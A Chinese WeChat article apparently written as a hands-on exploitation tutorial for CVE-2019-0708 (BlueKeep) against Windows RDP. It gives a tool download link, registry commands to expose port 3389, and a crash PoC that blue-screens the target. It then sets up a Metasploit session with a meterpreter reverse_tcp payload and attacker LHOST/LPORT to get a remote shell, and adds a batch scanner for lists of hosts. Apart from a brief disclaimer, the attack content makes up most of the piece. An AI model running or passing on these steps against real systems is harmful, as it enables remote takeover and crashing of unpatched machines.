> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/7a8uipxzl59ESxY8v59WYQ)

01 漏洞详情

Windows 系列服务器于 2019 年 5 月 15 号，被爆出高危漏洞，该漏洞影响范围较广，漏洞利用方式是通过远程桌面端口 3389，RDP 协议进行攻击的。这个漏洞是今年来说危害严重性最大的漏洞，跟之前的勒索，永恒之蓝病毒差不多。

影

响

范

围

影响系统：windows2003、windows2008、windows2008 R2、windows xp 、win7

危害请见下文![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuBXXWPJglS3J7Q17icYIKOzV0kW2EEccYhV3rG77MY9dlJ42ucv7DBJOvIVaB3lzBNu6KicLVDtrVQ/640?wx_fmt=png)

02 工具分享

链接：https://pan.baidu.com/s/1NeaYWuIFoRs0xCHW4S_ntw

提取码：n3zm 

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuBXXWPJglS3J7Q17icYIKOzZgpQhPy4h2iaSiane8CsUdBObY1xPvf1MSLL4cRw49Q0mlCAofrvA68w/640?wx_fmt=png)

环境

**攻击机**：kali IP: 10.1.8.167

**靶机**： win7 IP:10.1.8.8（开放 3389 端口）

**Win7** **靶机****开启和关闭 3389 端口**

（1）开启 3389 端口：

在 cmd 内，执行如下命令，即可开启 3389 端口。

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

（2）关闭 3389 端口：

在 cmd 内，执行如下命令，即可关闭 3389 端口。

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuBXXWPJglS3J7Q17icYIKOz1voFFJer9tuvepAsibLq0mwzSMHGicb0ic90nvqcIlYhpffTmla5tx2kQ/640?wx_fmt=png)

03 蓝屏

使用 nmap 对靶机进行扫描：

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuBXXWPJglS3J7Q17icYIKOzJjqfPkEKpfwMk6u53ABLljoTn4CBK3l56rKabCBJqur2jiadVc5bzTg/640?wx_fmt=png)

使用漏洞 POC 进行测试：

**POC**：https://github.com/n1xbyte/CVE-2019-0708

**用法：python3 crashpoc.py ip 地址 系统类型**

```
git clone https://github.com/n1xbyte/CVE-2019-0708.git
python3 crashpoc.py 10.1.8.8  64
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuBXXWPJglS3J7Q17icYIKOzP04dldmPcxPeqLu82SLJ3r8eHxPRlxAJSkReC6A4VE3UsFib83wBTJQ/640?wx_fmt=png)

靶机已蓝屏：

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuBXXWPJglS3J7Q17icYIKOzRcOIQBbqXCvxSu8Q1h3z146I0iceMVLOIeRIeemyCZenqYibhes4p5vA/640?wx_fmt=png)

04 反弹 shell

**https://github.com/biggerwing/CVE-2019-0708-poc**

. 配置 msf，将 exp 放置到 msf 对应文件夹下，如果同名直接覆盖（这里以 kali 为例）

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuBXXWPJglS3J7Q17icYIKOzCLN4cGrE4LFbruSRXwkdau7ZslBicK8iburSbPVxsiconflNmfMl4Ssiag/640?wx_fmt=png)

**将相应的** **E****XP 放到** **k****aili 里面相应的位置****，若是相同文件名就替换，若是不存在的文件就创建。**

```
rdp.rb -> /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rd
rdp_scanner.rb->/usr/share/Metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb
cve_2019_0708_bluekeep.rb->/usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb
cve_2019_0708_bluekeep_rce.rb->/usr/share/Metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb
```

然后在命令行下执行：

```
root@kali:~# msfconsole
msf5 > reload_all # 加载0708exp
msf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set rhosts 10.1.8.8
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) >show targets
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 3
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) >set LHOST 10.1.8.167  
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) >set LPORT 1234
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) >show options
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuBXXWPJglS3J7Q17icYIKOzNYZJTMvLc0nNs8jngRduYt3GucOahFz7xtpJ6IJ0sYJaLz377Wx4LQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuBXXWPJglS3J7Q17icYIKOzGA4QCYQ6nthGLciahavvXzeXgiaQpIkC5S5ZticrDrCzABz5aCF2ia60Bw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuBXXWPJglS3J7Q17icYIKOzIOTHYRiafFBE8VvzpYf8nF4GTAyJmycSZNpicQJfiblYTgSCybdfz8Ozw/640?wx_fmt=png)

注意事项

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuBXXWPJglS3J7Q17icYIKOzeO9XDDJW111bqcJdpuAYib7NgOZGZwLQvPhnD9KIkjibM98QOmHUN0lg/640?wx_fmt=png)

Target 要选对；  

如果没有反弹回来可以尝试换一下监听反弹的端口。

05 批量检测

这里参考的是 https://github.com/biggerwing/CVE-2019-0708-poc，为了方便，我在原来基础上加了个将成功的结果保存在单独文件的功能。

  

**Windows python3 环境**

**用****法：**

1. 编辑 3389_hosts，将待检测的 IP 地址写入文件，一行一个

2. 命令行切换到代码所在的目录，运行 python3 cve-2019-0708.py 

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuBXXWPJglS3J7Q17icYIKOzAibQ8wmjbnicDUoAhZNV2s4mdYCLVlAKJR9y7amauiaAXVgicDeXahEQHw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuBXXWPJglS3J7Q17icYIKOzPibdJjJ0drWCMrlSZwpe3VsS3Etwgocetc21C2ia9vAVqQvCXI7TUGRQ/640?wx_fmt=png)

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png)

END

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtIZ5VYusLbEoY8iaTjibTWg6AKjAQiahf2fctN4PSdYm2O1Hibr56ia39iaJcxBoe04t4nlYyOmRvCr56Q/640?wx_fmt=gif)

**看完记得点赞，关注哟，爱您！**

**请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

  

关注此公众号，各种福利领不停，轻轻松松学习 hacker 技术！

  

**在看你就赞赞我！**

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbThXaInFkmyjOOcBoNCXGun5icNbT4mjCjcREA3nMN7G8icS0IKM3ebuLA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTkwLkofibxKKjhEu7Rx8u1P8sibicPkzKmkjjvddDg8vDYxLibe143CwHAw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODvmiaOTvCLgk6nNRkiaWEOnrYYzicu94ATK3u3IjictJBNWn2SFnYsEtNvHQFrcKExdhG7kOJicflj72iag/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif)

扫码关注我们

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif)

扫码领 hacker 资料，常用工具，以及各种福利

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTnHS31hY5p9FJS6gMfNZcSH2TibPUmiam6ajGW3l43pb0ySLc1FibHmicibw/640?wx_fmt=gif)

转载是一种动力 分享是一种美德